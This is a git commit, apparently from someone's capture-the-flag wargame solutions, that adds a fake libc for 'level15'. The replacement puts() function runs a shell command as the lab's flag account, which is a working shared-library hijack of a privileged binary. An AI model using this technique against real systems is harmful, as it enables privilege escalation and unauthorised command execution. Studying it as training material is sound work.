6cc38a0151753bfb7239b521cf371d3a5e27f03b
liv-iu <liv-iu@localhost>
2012-07-13 11:59:36 +0300

    - solved level15 - reorganized files

---
+++ level15/libc.c
@@ -0,0 +1,27 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/syscall.h>
+
+// .. to avoid symbol undefined errors
+void __cxa_finalize(void * d) {
+}
+
+int puts(const char *s) {
+	system("/bin/cat /home/flag15/hall_of_fame");
+	
+	return 0;
+}
+
+// libc wrapper to call main
+int __libc_start_main(int (*main) (int, char **, char **), 
+	int argc, 
+	char **argv, 
+	void (*init) (void), 
+	void (*fini) (void), 
+	void (*rtld_fini) (void), 
+	void (* stack_end)
+) {
+	main(argc, argv, NULL);
+	
+	return 0;
+}
